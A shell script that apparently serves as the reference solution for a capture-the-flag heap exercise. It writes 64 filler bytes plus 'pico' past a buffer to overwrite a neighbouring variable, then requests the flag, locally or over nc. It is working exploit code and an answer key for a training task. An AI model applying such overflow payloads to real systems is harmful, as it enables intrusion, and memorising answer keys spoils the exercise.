#!/bin/sh
# Reference solution (shell form) for 02-cylab-heap-1.
# Set safe_var to exactly "pico".
#
# Usage:
#   ./solve.sh               solve a local ./chall  (needs ./chall and ./flag.txt here)
#   ./solve.sh HOST PORT     solve a deployed service over the network, via nc
#
# The payload is: option 2 (write), then 64 filler bytes followed by
# "pico" so it lands on the neighbouring variable, then option 4 (print flag).

PAD=$(printf 'A%.0s' $(seq 1 64))
PAYLOAD="${PAD}pico"

send() {
	printf '2\n%s\n4\n' "$PAYLOAD"
}

if [ "$#" -ge 2 ]; then
	send | nc "$1" "$2"
else
	send | ./chall
fi
